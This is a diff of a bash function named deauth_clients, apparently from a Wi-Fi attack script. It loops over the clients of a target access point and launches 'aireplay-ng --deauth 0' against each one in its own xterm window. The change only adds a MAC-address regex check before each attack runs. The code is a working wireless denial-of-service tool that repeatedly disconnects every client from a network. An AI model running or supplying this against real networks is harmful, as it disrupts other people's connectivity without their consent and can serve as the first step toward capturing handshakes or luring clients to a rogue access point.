@@ -26,19 +26,22 @@ deauth_clients () {
     do
         ccl="${clients[${idx}]}"
         
-        xterm -T "$ccl" -fg green -bg black -e "aireplay-ng --deauth 0 -a ${bssid} -c ${ccl} ${iface}" &> /dev/null &
-        cpd=$!
-
-        idx+=1
-
-        if [[ "$idx" = "${#clients[@]}" ]]
+        if [[ "$ccl" =~ $macrgx ]]
         then
-            idx=0
-            update_clients
-        fi
+            xterm -T "$ccl" -fg green -bg black -e "aireplay-ng --deauth 0 -a ${bssid} -c ${ccl} ${iface}" &> /dev/null &
+            cpd=$!
+
+            idx+=1
+
+            if [[ "$idx" = "${#clients[@]}" ]]
+            then
+                idx=0
+                update_clients
+            fi
         
-        sleep 7
-        kill $cpd
+            sleep 7
+            kill $cpd
+        fi
     done
 }
 
